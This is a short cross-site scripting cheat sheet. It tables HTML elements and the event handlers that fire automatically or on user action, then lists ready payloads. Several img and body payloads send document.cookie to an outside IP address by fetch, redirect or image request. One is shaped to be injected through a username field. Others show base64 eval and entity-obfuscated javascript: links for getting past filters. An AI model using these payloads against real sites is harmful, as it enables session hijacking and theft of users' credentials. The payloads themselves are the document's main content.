# XSS PAYLOADS
-

## Auto-Triggered 

| Element | Events |
|----------|---------|
| `<body>` | `onload` |
| `<img>` | `onload`, `onerror` |
| `<svg>` | `onload` |
| `<iframe>` | `onload` |
| `<video>` | `onload`, `onerror` |
| `<audio>` | `onload`, `onerror` |

## User-Triggered

| Element | Events |
|----------|---------|
| `<a>` | `onclick`, `onmouseover` |
| `<button>` | `onclick` |
| `<div>` | `onclick`, `onmouseover` |
| `<span>` | `onclick`, `onmouseover` |

## Form Elements

| Element | Events |
|----------|---------|
| `<input>` | `onfocus`, `onblur`, `onchange` |
| `<textarea>` | `onfocus`, `onblur`, `onchange` |
| `<select>` | `onchange` |
| `<form>` | `onsubmit`, `onreset` |



<img src=x onerror="xss_PAYLOAD">
<img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">

fetch('http://IP ADDRESS/?c=' + document.cookie)
<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">

ENCODED - > base64 playload -> pop up
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
